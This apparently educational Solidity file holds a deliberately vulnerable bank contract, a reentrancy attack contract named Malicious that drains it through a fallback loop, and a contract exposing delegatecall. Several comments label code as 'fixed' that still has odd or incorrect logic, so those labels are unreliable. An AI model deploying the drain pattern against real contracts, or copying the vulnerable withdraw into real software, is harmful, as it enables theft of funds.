// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    // 🛑 **Reentrancy Vulnerability** 🛑
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        (bool success, ) = msg.sender.call{value: _amount}(""); // 🚨 Unprotected call (reentrancy attack)
        require(success, "Transfer failed");

        balances[msg.sender] -= _amount;
    }

    // 🛑 **Fixed Integer Underflow/Overflow**
    function setBalance(uint256 _newBalance) public {
        require(_newBalance <= balances[msg.sender], "New balance exceeds current balance");
        balances[msg.sender] -= _newBalance; 
    }

    // 🚨 **Fixed `selfdestruct` (Deprecated)**
    function kill() public {
        require(msg.sender == address(this), "Only contract can self-destruct"); // Added protection
        selfdestruct(payable(address(0))); // Send funds to zero address (if necessary)
    }

    // ✅ **Added Receive Function to Fix Slither Warnings**
    receive() external payable {}
}

contract Malicious {
    VulnerableBank public target;

    constructor(address payable _target) { // 🔥 Fixed issue by making `_target` payable
        target = VulnerableBank(_target);
    }

    // 🛑 **Reentrancy Attack**
    fallback() external payable {
        if (address(target).balance > 0) {
            target.withdraw(1 ether);
        }
    }

    function attack() public payable {
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }

    receive() external payable {} // 🔥 Added to handle direct ETH transfers
}

contract UnsafeDelegate {
    address public owner;
    mapping(address => bool) public isAdmin;

    constructor() {
        owner = msg.sender;
    }

    // 🛑 **Fixed Delegatecall Security Issue**
    function execute(address _target, bytes memory _data) public returns (bool) { // 🔥 Fixed return type
        require(isAdmin[msg.sender], "Not an admin");
        (bool success, bytes memory returnData) = _target.delegatecall(_data);
        require(success, "Delegatecall failed");
        return success; // 🔥 Fixed return type mismatch
    }

    function addAdmin(address _admin) public {
        require(msg.sender == owner, "Only owner can add admins");
        isAdmin[_admin] = true;
    }
}
